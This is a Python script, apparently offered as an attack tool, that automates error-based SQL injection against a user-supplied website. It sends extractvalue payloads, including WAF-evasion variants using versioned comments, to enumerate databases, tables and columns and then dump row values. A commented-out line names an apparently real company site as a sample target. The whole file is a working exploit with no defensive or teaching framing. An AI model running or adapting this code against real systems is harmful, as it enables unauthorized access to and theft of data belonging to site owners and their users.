import requests
import time
import os

os.system('cls')
print("")
print("  ██╗  ██╗██████╗  █████╗ ████████╗██╗  ██╗    ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗")
print("  ╚██╗██╔╝██╔══██╗██╔══██╗╚══██╔══╝██║  ██║    ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║")
print("   ╚███╔╝ ██████╔╝███████║   ██║   ███████║    ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║")
print("   ██╔██╗ ██╔═══╝ ██╔══██║   ██║   ██╔══██║    ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║")
print("  ██╔╝ ██╗██║     ██║  ██║   ██║   ██║  ██║    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║")
print("  ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝")
print("                                                                                                                   ")



#web="https://www.jasmineexports.com/category.php?catid=2"
web=input("Website => ")

database1 = "+and+extractvalue(rand(),concat(0x7e,(select+schema_name+from+information_schema.schemata+limit+"
database2 = ",1),0x7e7e))--"
database1v1 = "%27+and+extractvalue(rand(),concat(0x7e,(select+schema_name+from+information_schema.schemata+limit+"
database2v2 = ",1),0x7e7e))--+"
databaseACE1 = "+and+/*!12345extractvalue(rand(),CONCAT(0x7e,(select+schema_name+from/**/information_schema./**/schemata+limit+"
databaseACE2 = ",1),0x7e7e))*/--"
databaseACE1v1 = "%27+and+/*!12345extractvalue(rand(),CONCAT(0x7e,(select+schema_name+from/**/information_schema./**/schemata+limit+"
databaseACE2v2 = ",1),0x7e7e))*/--+"
version1 = "+and+extractvalue(rand(),concat(0x7e,version(),0x7e7e))--"
version2 = "%27+and+extractvalue(rand(),concat(0x7e,version(),0x7e7e))--+"
tables1 = "+and+extractvalue(rand(),concat(0x7e,(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+"
tables2 = ",1),0x7e7e))--"
tables1v1 = "%27+and+extractvalue(rand(),concat(0x7e,(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+"
tables2v2 = ",1),0x7e7e))--+"
columns1 = "+and+extractvalue(rand(),concat(0x7e,(select+column_name+from+information_schema.columns+where+table_name=database()+limit+"
columns2 = ",1),0x7e7e))--"
columns1v1 = "%27+and+extractvalue(rand(),concat(0x7e,(select+column_name+from+information_schema.columns+where+table_name=database()+limit+"
columns2v2 = ",1),0x7e7e))--+"
dump1 = "+and+extractvalue(rand(),concat(0x7e,(select+concat(column_name)+from+database()+limit+"
dump2 = ",1),0x7e7e))--"
dump1v1 = "%27+and+extractvalue(rand(),concat(0x7e,(select+concat+(column_name)+from+database()+limit+"
dump2v2 = ",1),0x7e7e))--+"

#for i in range(0,1000):
i = 0
i1 = 0
i2 = 0
i3 = 0
i4 = 0
i5 = 0
print("\n=========================")
print("\tVersion")
print("=========================")
xpathV = requests.get(f'{web}{version1}').text
if "~~" not in xpathV:
	xpathV = requests.get(f'{web}{version2}').text
xpathV2 = xpathV.find("~")
xpathV3 = xpathV.find("~~")
xpathV4 = xpathV[xpathV2:xpathV3]
print([i+1],xpathV4)
print("=========================")
time.sleep(1)
print("\n=========================")
print("\tDatabases")
print("=========================")
while True:
	xpathD = requests.get(f'{web}{database1}{str(i)}{database2}').text
	if "~~" not in xpathD:
		xpathD = requests.get(f'{web}{database1v1}{str(i)}{database2v2}').text
	if "Not Acceptable!" in xpathD:
		xpathD = requests.get(f'{web}{databaseACE1}{str(i)}{databaseACE2}').text
		if "~~" not in xpathD:
			xpathD = requests.get(f'{web}{databaseACE1v1}{str(i)}{databaseACE2v2}').text
	xpathD2 = xpathD.find("~")
	xpathD3 = xpathD.find("~~")
	xpathD4 = xpathD[xpathD2:xpathD3]
	if "~~" not in xpathD:
		database = input("\nDatabase => ")

		print("\n=========================")
		print("\tTables")
		print("=========================")

		while True:
			databaseORG = "'"
			databaseORG2 = databaseORG+database+databaseORG
			databaseORG3 = tables1.replace("database()" , databaseORG2)
			xpathT = requests.get(f'{web}{databaseORG3}{str(i1)}{tables2}').text
			if "~~" not in xpathT:
				databaseORG3 = tables1v1.replace("database()" , databaseORG2)
				xpathT = requests.get(f'{web}{databaseORG3}{str(i1)}{tables2v2}').text
			xpathT2 = xpathT.find("~")
			xpathT3 = xpathT.find("~~")
			xpathT4 = xpathT[xpathT2:xpathT3]
			if "~~" not in xpathT:
				tables = input("\nTables => ")

				print("\n=========================")
				print("\tColumns")
				print("=========================")

				while True:
					tableORG = "'"
					tableORG2 = tableORG+tables+tableORG
					tablesORG3 = columns1.replace("database()" , tableORG2)
					xpathC = requests.get(f'{web}{tablesORG3}{str(i2)}{columns2}').text
					if "~~" not in xpathC:
						tablesORG3 = columns1v1.replace("database()" , tableORG2)
						xpathC = requests.get(f'{web}{tablesORG3}{str(i2)}{columns2v2}').text
					xpathC2 = xpathC.find("~")
					xpathC3 = xpathC.find("~~")
					xpathC4 = xpathC[xpathC2:xpathC3]
					if "~~" not in xpathC:
						dump = input("Columns => ")

						print("\n=========================")
						print("\t",dump)
						print("=========================")

						while True:
							columnORG2 = tables
							columnORG3 = dump1.replace("database()" , columnORG2)
							columnORG4 = columnORG3.replace("column_name" , dump)
							xpathP = requests.get(f'{web}{columnORG4}{str(i3)}{dump2}').text
							if "~~" not in xpathP:
								columnORG3 = dump1v1.replace("database()" , columnORG2)
								columnORG4 = columnORG3.replace("column_name" , dump)
								xpathP = requests.get(f'{web}{columnORG4}{str(i3)}{dump2v2}').text
							xpathP2 = xpathP.find("~")
							xpathP3 = xpathP.find("~~")
							xpathP4 = xpathP[xpathP2:xpathP3]
							if "~~" not in xpathP:
								dumpp = input("\nColumns2 => ")

								print("\n=========================")
								print("\t",dumpp)
								print("=========================")

								while True:
									column2ORG2 = tables
									column2ORG3 = dump1.replace("database()" , column2ORG2)
									columnORG4v4 = column2ORG3.replace("column_name" , dumpp)
									xpathPv = requests.get(f'{web}{columnORG4v4}{str(i4)}{dump2}').text
									if "~~" not in xpathPv:
										column2ORG3 = dump1v1.replace("database()" , column2ORG2)
										columnORG4v4 = column2ORG3.replace("column_name" , dumpp)
										xpathPv = requests.get(f'{web}{columnORG4v4}{str(i4)}{dump2v2}').text
									xpathP2v2 = xpathPv.find("~")
									xpathP3v3 = xpathPv.find("~~")
									xpathP4v4 = xpathPv[xpathP2v2:xpathP3v3]
									if "~~" not in xpathPv:
										exit()
									print([i4+1],xpathP4v4)
									print("=========================")
									i4=i4+1

							print([i3+1],xpathP4)
							print("=========================")
							i3=i3+1

					print([i2+1],xpathC4)
					print("=========================")
					i2=i2+1

			print([i1+1],xpathT4)
			print("=========================")
			i1=i1+1

	print([i+1],xpathD4)
	print("=========================")
	i=i+1

